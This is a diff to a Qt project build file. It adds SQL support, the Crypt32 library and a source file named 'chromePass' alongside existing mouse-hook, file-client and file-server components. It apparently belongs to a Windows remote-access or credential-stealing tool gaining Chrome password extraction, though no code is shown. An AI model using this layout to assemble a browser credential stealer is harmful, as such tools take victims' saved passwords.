@@ -1,5 +1,6 @@
 QT += core
 QT += network
+QT += sql
 
 #QT += widgets
 
@@ -13,7 +14,8 @@ TEMPLATE = app
 
 LIBS += User32.lib \
         Gdi32.lib \
-        Gdiplus.lib
+        Gdiplus.lib \
+        Crypt32.lib \
 
 INCLUDEPATH += ../includes/
 
@@ -23,7 +25,8 @@ SOURCES += \
         ../includes/config.cpp \
         ../includes/fileclient.cpp \
         ../includes/fileserver.cpp \
-        ../includes/mousehookWinApi.cpp
+        ../includes/mousehookWinApi.cpp \
+        ../includes/chromePass.cpp
 
 
 HEADERS += \
@@ -31,7 +34,9 @@ HEADERS += \
         ../includes/config.h \
         ../includes/fileclient.h \
         ../includes/fileserver.h \
-        ../includes/mousehookWinApi.h
+        ../includes/mousehookWinApi.h \
+        ../includes/chromePass.h \
+        ../includes/files.h
 
 # The following define makes your compiler emit warnings if you use
 # any feature of Qt which as been marked deprecated (the exact warnings
